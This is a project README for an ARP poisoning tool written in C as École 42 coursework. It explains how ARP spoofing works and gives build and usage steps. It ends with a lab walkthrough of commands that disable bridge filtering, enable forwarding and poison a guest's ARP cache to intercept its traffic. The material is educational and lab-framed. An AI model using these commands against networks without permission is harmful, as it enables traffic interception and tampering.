# 42 Malcolm

![OS](https://img.shields.io/badge/OS-Linux-blue.svg)
![Language](https://img.shields.io/badge/Language-C-orange.svg)
![Status](https://img.shields.io/badge/Status-Pending_Evaluation-darkgrey.svg?logo=42)
[![Tests](https://github.com/vinicius507/ft_malcolm/actions/workflows/tests.yml/badge.svg)](https://github.com/vinicius507/ft_malcolm/actions/workflows/tests.yml)

[![en](https://img.shields.io/badge/Lang-en-red.svg)](./README.md)
[![pt-br](https://img.shields.io/badge/Lang-pt--br-green.svg)](./README.pt-br.md)

An ARP Poisoning tool written in C using the 99 standard.

> [!WARNING]
>
> This application performs ARP spoofing, a network attack technique that can
> disrupt communication on a network. Using ARP spoofing without permission is
> a violation of security policies and may be illegal. It's crucial to only use
> this tool in controlled environments, such as a personal lab network, for
> educational or testing purposes.
>
> This tool was built as part of the École 42 Security curriculum and is
> intended for educational purposes only. The author does not condone or
> encourage the use of this tool for malicious purposes.

## What is ARP?

The Address Resolution Protocol is a Layer 2 protocol that maps hardware
addresses, such as a MAC address, to a Layer 3 protocol address, such as an
IPv4 address.

## How does ARP poisoning work?

The ARP protocol is a stateless protocol, meaning that network hosts will
automatically cache any ARP replies they receive, regardless of whether they
requested them.

ARP poisoning works by sending unsolicited ARP replies to a host, associating
a protocol address to the attackers hardware address.

## Usage

### Building from Source

**Requirements:**

- Clang 12
- GNU Make
- [My Libft library](https://github.com/vinicius507/libft)

**Instructions:**

1. Clone the 42 Malcolm repository:

   ```bash
   git clone https://github.com/vinicius507/ft_malcolm.git
   ```

2. Clone the Libft repository:

   ```bash
   git clone https://github.com/vinicius507/libft.git
   ```

3. Navigate to the project directory:

   ```bash
   cd ft_malcolm
   ```

4. Build the tool:

   ```bash
   make LIBFT_DIR=../libft/libft -C ./ft_malcolm # Adjust the path if necessary
   ```

### Building with Nix

If you prefer using Nix, you can build the application by navigating to the
project directory and using the following command:

```bash
nix build .#
```

This assumes you have a valid Nix environment set up. The build process will
handle downloading and linking dependencies automatically.

### Running the Application

**Before running:**

- Ensure you have **explicit permission** to run this tool on the target network.
- Be aware of the potential impact of ARP poisoning on the network.

**Running the tool:**

> [!NOTE]
>
> It is required to have root privileges to run the application.

```bash
./ft_malcolm [OPTION...] SOURCE_IP SOURCE_MAC TARGET_IP TARGET_MAC
```

**Positional Arguments:**

- `SOURCE_IP`: The IP address to be spoofed as the source.
- `SOURCE_MAC`: The MAC address to be spoofed as the source.
- `TARGET_IP`: The IP address of the target device.
- `TARGET_MAC`: The MAC address of the target device.

**Optional Arguments:**

- `-g, --gratuitous`: Send a gratuitous ARP packet to broadcast (`FF:FF:FF:FF:FF:FF`).
- `-i, --interface`: The network interface to use, if not specified, the first
  available interface will be used.
- `-v, --verbose`: Enable verbose output for packet information.

**Example:**

```bash
./ft_malcolm 192.168.122.67 AA:BB:CC:DD:EE:FF 192.168.122.206 00:11:22:33:44:55
```

## Testing Environment

The application was tested on a virtualized environment using QEMU/KVM with the
following setup:

- **Host OS (Attacker):** NixOS 24.11
- **Guest 1 OS:** Debian 12
- **Guest 2 OS:** Debian 12
- **Network:** Bridged network with DHCP

For ARP poisoning to work, the bridge network must be configured to not filter
packets using the host system firewall. This can be done by running the
following commands as root on the host:

```bash
ip link set dev BRIDGE type bridge nf_call_arptables 0
ip link set dev BRIDGE type bridge nf_call_iptables 0
```

Where `BRIDGE` is the name of the bridge network interface.

If you wish to forward packets from the host between the guest and the network,
you can enable IP forwarding by running:

```bash
sysctl -w net.ipv4.ip_forward=1
```

To perform the attack, you can run the application on the host, spoofing the
guest IP and MAC address as the source and the router IP and MAC address as the
target.

First, send a gratuitous ARP packet to intercept all traffic going to `GUEST_1`:

```bash
./ft_malcolm GUEST_1_IP ATTACKER_MAC --interface=BRIDGE --gratuitous
```

Then, listen for ARP packets from `GUEST_1` requesting the `GUEST_2` MAC address:

```bash
./ft_malcolm GUEST_2_IP ATTACKER_MAC GUEST_1_IP GUEST_1_MAC --interface=BRIDGE
```

Checking the ARP cache on `GUEST_1` should show the `GUEST_2` MAC address as
the attacker's MAC address.

```bash
$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
ATTACKER_IP      0x1         0x2         ATTACKER_MAC          *        BRIDGE
GUEST_2_IP       0x1         0x2         ATTACKER_MAC          *        BRIDGE
```

This will intercept all traffic from `GUEST_1` to `GUEST_2`, allowing you to
inspect and modify packets as needed.
